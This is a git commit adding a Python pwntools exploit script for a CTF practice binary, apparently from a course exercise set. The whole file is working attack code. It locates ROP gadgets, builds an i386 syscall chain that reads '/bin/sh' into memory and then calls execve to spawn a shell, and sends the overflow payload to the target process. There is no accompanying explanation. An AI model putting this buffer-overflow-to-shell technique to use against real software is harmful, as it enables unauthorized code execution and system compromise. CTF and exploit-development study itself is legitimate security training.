9c062924bb55e09a8b17c9e70d024024ca8b5f26
qianfei11 <490584635@qq.com>
2019-03-18 01:43:58 -0700

    2019/3/18

---
+++ [winesap] [ctf-pwn] stcs 2016/w4/practice3/exp.py
@@ -0,0 +1,50 @@
+#!/usr/bin/env python
+from pwn import *
+context.arch = 'i386'
+p = process('./p3')
+elf = ELF('./p3')
+g = lambda x: next(elf.search(asm(x)))
+ret = g('ret')
+info('ret = ' + hex(ret))
+pop_eax_ret = g('pop eax ; ret')
+pop_ebx_ret = g('pop ebx ; ret')
+pop_ecx_ret = g('pop ecx ; ret')
+pop_edx_ret = g('pop edx ; ret')
+int_0x80_ret = g('int 0x80 ; ret') 
+buf = 0x080eb000 - 100
+# gdb.attach(p)
+offset = 204
+# read(0, '/bin/sh\x00', 100)
+rop1 = [
+	pop_eax_ret, 
+	3, 
+	pop_ebx_ret, 
+	0, 
+	pop_ecx_ret, 
+	buf, 
+	pop_edx_ret, 
+	100, 
+	int_0x80_ret, 
+]
+# execve('/bin/sh\x00', 0, 0)
+rop2 = [
+	pop_eax_ret, 
+	0xb, 
+	pop_ebx_ret, 
+	buf, 
+	pop_ecx_ret, 
+	0, 
+	pop_edx_ret, 
+	0, 
+	int_0x80_ret
+]
+rop = ''.join(map(p32, rop1 + rop2))
+info('len(rop) = ' + str(len(rop)))
+offset2 = offset - len(rop)
+info('offset2 = ' + str(offset2))
+payload = p32(ret) * (offset2 / 4) + rop
+info('len(payload) = ' + str(len(payload)))
+# payload = cyclic(500)
+p.sendline(payload)
+p.sendline('/bin/sh\x00')
+p.interactive()
